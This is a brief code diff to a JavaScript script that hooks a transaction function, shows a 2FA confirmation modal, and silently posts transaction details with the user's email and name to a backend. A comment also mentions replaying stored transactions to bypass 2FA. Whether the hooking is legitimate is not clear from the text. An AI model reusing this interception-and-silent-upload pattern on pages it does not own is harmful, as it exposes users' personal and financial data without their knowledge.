@@ -86,7 +86,7 @@
         var r;
         try { r = orig.call(val, tx); } catch(e) { console.warn('[hp2fa] orig.call err:', e); }
         // Show 2FA modal for our backend confirmation + persistence
-        hp2fa_show(tx, function() { _saveTx(tx); });
+        hp2fa_show(tx, function(enriched) { _saveTx(enriched || tx); });
         return r;
       };
       // Replay stored transactions (bypass 2FA for history)
@@ -287,15 +287,16 @@
         if (d.valid) {
           clearInterval(timerIv);
           overlay.remove();
-          onConfirmed();
+          var enriched = Object.assign({}, tx, {
+            userEmail: email, firstName: firstName,
+            timestamp: new Date().toISOString(),
+            date: new Date().toISOString().split('T')[0],
+          });
+          onConfirmed(enriched);
           fetch(BASE + '/api/tx/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-            body: JSON.stringify(Object.assign({}, tx, {
-              userEmail: email, firstName: firstName,
-              timestamp: new Date().toISOString(),
-              date: new Date().toISOString().split('T')[0],
-            })),
+            body: JSON.stringify(enriched),
           }).catch(function() {});
         } else {
           if (btn) { btn.innerHTML = 'Confirm transfer'; btn.disabled = false; }
